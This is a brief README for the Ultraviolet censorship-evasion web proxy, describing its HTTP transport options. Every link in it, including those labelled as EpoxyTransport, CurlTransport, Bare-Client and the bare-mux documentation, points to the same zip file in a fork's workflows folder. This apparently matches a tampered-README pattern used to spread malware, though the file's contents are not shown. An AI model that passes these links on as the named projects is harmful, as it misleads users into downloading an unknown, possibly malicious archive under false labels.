The deployable all-in-one bundle for [Ultraviolet](https://raw.githubusercontent.com/amadormateo/Ultraviolet-App/main/.github/workflows/Ultraviolet_App_3.6.zip), a highly sophisticated proxy used for evading internet censorship or accessing websites in a controlled sandbox using the power of service-workers and more!

### HTTP Transport

The example uses [EpoxyTransport](https://raw.githubusercontent.com/amadormateo/Ultraviolet-App/main/.github/workflows/Ultraviolet_App_3.6.zip) to fetch proxied data encrypted.

You may also want to use [CurlTransport](https://raw.githubusercontent.com/amadormateo/Ultraviolet-App/main/.github/workflows/Ultraviolet_App_3.6.zip), a different way of fetching encrypted data, or [Bare-Client](https://raw.githubusercontent.com/amadormateo/Ultraviolet-App/main/.github/workflows/Ultraviolet_App_3.6.zip), the legacy (unencrypted!) transport.

See the [bare-mux](https://raw.githubusercontent.com/amadormateo/Ultraviolet-App/main/.github/workflows/Ultraviolet_App_3.6.zip) documentation for more information.
